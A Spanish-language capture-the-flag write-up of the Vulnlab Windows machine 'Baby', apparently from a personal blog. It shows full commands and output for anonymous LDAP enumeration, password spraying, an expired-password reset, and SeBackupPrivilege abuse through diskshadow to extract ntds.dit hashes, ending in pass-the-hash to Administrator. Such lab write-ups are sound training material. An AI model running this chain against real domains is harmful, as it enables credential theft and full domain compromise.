---
layout: single
title: Baby - Vulnlab
excerpt: "En este post vamos a estar realizando la máquina Baby de la plataforma de Vulnlab es una máquina Windows de categoría fácil creada por xct donde mediante el protocolo LDAP podremos enumerar usuarios válidas sin autenticarnos y obtener una contraseña en texto plano que usando la misma la cambiaremos con smbpasswd, ya que la contraseña obtenida era vieja gracias a eso podremos conectarnos con evil-winrm con ese usuario para la escalada de privilegios abusaremos de que tenemos los privilegios SeBackupPrivilege y SeRestorePrivilege."
date: 2024-02-25
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/Baby-vulnhub/baby_icon.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - Ldap Enumeration
  - SeBackupPrivilege
  - SeRestorePrivilege
  - Active Directory
---

## PortScan

- Vamos a empezar escaneando puertos abiertos por el método **TCP** con la herramienta **Nmap**. Además, vamos a escanear las tecnologías que se están empleando en esos puertos.

```bash
➜  nmap sudo nmap -sCV -p53,88,135,139,445,636,3269,3389,5985,9389,49664,49667,49674,49675,56601 10.10.88.84 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 17:15 CST
Nmap scan report for 10.10.88.84
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-25 23:15:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2024-02-24T23:10:04
|_Not valid after:  2024-08-25T23:10:04
|_ssl-date: 2024-02-25T23:16:53+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-25T23:16:13+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
56601/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-02-25T23:16:16
|_  start_date: N/A
```

- Ya vemos que **Nmap** nos reporta dominios antes de agregarlos al **/etc/hosts**. Vamos a seguir enumerando la máquina.

## Domains and versions 

- Con la herramienta **crackmapexec** para obtener información sobre la máquina, como la versión del Windows que está utilizando y algún dominio.

```bash
➜  nmap crackmapexec smb 10.10.88.84
SMB         10.10.88.84     445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```

- Vemos que nos reporta el mismo dominio que nos dio **Nmap** vamos a agregarlo al **/etc/hosts**.

```bash
➜  nmap echo "10.10.88.84 baby.vl" | sudo tee -a /etc/hosts
10.10.88.84 baby.vl
➜  nmap ping -c 1 baby.vl
PING baby.vl (10.10.88.84) 56(84) bytes of data.
64 bytes from baby.vl (10.10.88.84): icmp_seq=1 ttl=127 time=183 ms

--- baby.vl ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 183.341/183.341/183.341/0.000 ms
➜  nmap
```

## DNS Enumeration

- Al estar el puerto **53** abierto, podemos usar la herramienta **dig** registros e información, entre otras cosas más <https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-dns>.

```bash
➜  nmap dig any baby.vl @10.10.88.84

; <<>> DiG 9.19.19-1-Debian <<>> any baby.vl @10.10.88.84
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33779
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;baby.vl.			IN	ANY

;; ANSWER SECTION:
baby.vl.		600	IN	A	10.10.88.84
baby.vl.		3600	IN	NS	babydc.baby.vl.
baby.vl.		3600	IN	SOA	babydc.baby.vl. hostmaster.baby.vl. 41 900 600 86400 3600

;; ADDITIONAL SECTION:
babydc.baby.vl.		1200	IN	A	10.10.88.84

;; Query time: 188 msec
;; SERVER: 10.10.88.84#53(10.10.88.84) (TCP)
;; WHEN: Sun Feb 25 17:30:29 CST 2024
;; MSG SIZE  rcvd: 136
```

- Podemos ver que tenemos otro dominio a sí que vamos a agregarlo al **/etc/hosts**.

```bash
➜  nmap sudo sed -i 's/\<baby.vl\>/& babydc.baby.vl/' /etc/hosts

➜  nmap cat /etc/hosts | tail -n 1
10.10.88.84 baby.vl babydc.baby.vl
➜  nmap
```

## LDAP Enumeration

- Bueno, tenemos el puerto **389** que pertenece al servicio de **LDAP**. Podemos enumerar este servicio con la herramienta `ldapsearch` <https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-ldap>.

```bash
➜  content ldapsearch -x -b "DC=baby,DC=vl" -H ldap://10.10.88.84  "*"
```

- Tenemos un **Output** muy largo, pero vamos a filtrar por el nombre de usuario para poder tener una lista.

```bash
➜  content  ldapsearch -x -b "DC=baby,DC=vl" -H ldap://10.10.88.84 "*" | grep userPrincipalName | cut -d " " -f 2 | cut -d "@" -f 1 > list.txt
➜  content cat list.txt
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
➜  content
```

- También tenemos una contraseña.

```bash
➜  content ldapsearch -x -b "DC=baby,DC=vl" -H ldap://10.10.88.84 | grep desc
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Set initial password to BabyStart123!
➜  content
```

- Ahora vamos a verificar si los usuarios son válidos con la herramienta **Kerbrute** <https://github.com/ropnop/kerbrute>.

```bash
➜  content ./kerbrute userenum -d baby.vl --dc babydc.baby.vl list.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/25/24 - Ronnie Flathers @ropnop

2024/02/25 17:48:38 >  Using KDC(s):
2024/02/25 17:48:38 >  	babydc.baby.vl:88

2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Joseph.Hughes@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Connor.Wilkinson@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Kerry.Wilson@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Leonard.Dyer@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Teresa.Bell@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Jacqueline.Barnett@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Ashley.Webb@baby.vl
2024/02/25 17:48:38 >  [+] VALID USERNAME:	 Hugh.George@baby.vl
2024/02/25 17:48:38 >  Done! Tested 8 usernames (8 valid) in 0.189 seconds
➜  content
```

- Vamos a ver a qué usuario le pertenece la contraseña. **(En el output donde nos dan la contraseña observamos al usuario Teresa Bell)** vamos a agregarla ala lista.

<p align="center">
<img src="https://i.imgur.com/zfIEZ1d.png">
</p>

- Al parecer cambió la contraseña, pero podemos ver si es correcta con **crackmapexec**.

```bash
➜  content crackmapexec smb baby.vl -u teresa.bell -p 'BabyStart123!'
SMB         baby.vl         445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         baby.vl         445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE
➜  content
```

- Vamos a hacer un **Password Spraying** para ver si alguien más utiliza la contraseña, pero antes vamos a volver a ver los usuarios, ya que al parecer me olvidé de algunos.

```bash
➜  content cat users.txt
Ian.Walker
Leonard.Dyer
Hugh.George
Ashley.Webb
Jacqueline.Barnett
Teresa.Bell
Kerry.Wilson
Joseph.Hughes
Caroline.Robinson
Connor.Wilkinson
➜  content
```

- Ahora sí, procedemos a usar **crackmapexec**.

```bash
➜  content crackmapexec smb baby.vl -u users.txt -p 'BabyStart123!' --continue-on-success
SMB         baby.vl         445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         baby.vl         445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
SMB         baby.vl         445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE
➜  content
```

## Shell as caroline Robinson

- Como pudimos ver, nos da un mensaje de **STATUS_PASSWORD_MUST_CHANGE** que significa que la contraseña ya fue cambiada, pero podemos cambiarla usando la herramienta `smbpasswd` <https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html>.

```bash
➜  content smbpasswd -r baby.vl -U caroline.robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson
➜  content
```

- Ahora vamos a ver si la contraseña es correcta.

```bash
➜  content crackmapexec smb baby.vl -u caroline.robinson -p 'NewPass$!xd'
SMB         baby.vl         445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         baby.vl         445    BABYDC           [+] baby.vl\caroline.robinson:NewPass$!xd
➜  content crackmapexec winrm baby.vl -u caroline.robinson -p 'NewPass$!xd'
SMB         baby.vl         5985   BABYDC           [*] Windows 10.0 Build 20348 (name:BABYDC) (domain:baby.vl)
HTTP        baby.vl         5985   BABYDC           [*] http://baby.vl:5985/wsman
WINRM       baby.vl         5985   BABYDC           [+] baby.vl\caroline.robinson:NewPass$!xd (Pwn3d!)
➜  content
```

- Cómo nos da un **Pwn3d!** en **winrm** podemos conectarnos empleando **evil-winrm**.

```bash
➜  content evil-winrm -i 10.10.88.84 -u caroline.robinson -p 'NewPass$!xd'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami
baby\caroline.robinson
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```

## User flag

<p align="center">
<img src="https://i.imgur.com/n3kaWuQ.png">
</p>

## Privilege Escalation

- Vamos a ver los privilegios que tenemos como usuario.

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop>
```

- Tenemos el **SeBackupPrivilege** con esto podemos realizar copias de seguridad del sistema y archivos protegidos y tenemos el **SeRestorePrivilege** con esto podemos restaurar archivos y directorios del sistema <https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/> .

- Vamos a usar el método **1**.

>We are instructing the diskshadow to create a copy of the C: Drive into a Z Drive with raj as its alias. The Drive Alias and Character can be anything you want. After creating this dsh file, we need to use the unix2dos to convert the encoding and spacing of the dsh file to the one that is compatible with the Windows Machine.

```bash
➜  content nano raj.dsh
➜  content cat raj.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
➜  content unix2dos raj.dsh
unix2dos: converting file raj.dsh to DOS format...
➜  content
```

>Back to the WinRM Session, we move to the Temp Directory and upload the raj.dsh file to the target machine. Then, we use the diskshadow with dsh script as shown in the image below. If observed, it can be noticed that diskshadow is indeed executing the same commands that we entered in the dsh file sequentially. After running, as discussed, it will create a copy of the C drive into Z drive. Now, we can use the RoboCopy tool to copy the file from the Z Drive to the Temp Directory.

- Una vez hecho esto:

<p align="center">
<img src="https://i.imgur.com/8zJh5s0.png">
</p>

- Seguimos con lo siguiente:

>We are now in the possession of the ntds.dit file and we need to extract the system hive. This can be done with a simple reg save command as demonstrated in the image below. With now both ntds.dit file and system hive file in the Temp directory, we now use the download command to transfer both of these files to our Kali Linux.

<p align="center">
<img src="https://i.imgur.com/o6F4fmp.png">
</p>

- Ahora simplemente quedaría extraer los Hashes.

>On our Kali Linux shell, we can use the secretsdump script that is a part of the Impacket Framework to extract our hashes from the ntds.dit file and the system hive. It can be observed from the image below that the hashes for the Administrator account have been successfully extracted.

<p align="center">
<img src="https://i.imgur.com/HVzEQO0.png">
</p>

## Root.txt

- Después de descargar los archivos y usar `impacket-secretsdump` nos conectamos como el **Administrator**.

```bash
➜  ~ evil-winrm -i 10.10.88.84 -u Administrator -H ee4457**********************

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

- Aquí vemos la flag.

<p align="center">
<img src="https://i.imgur.com/Si0Gzuk.png">
</p>
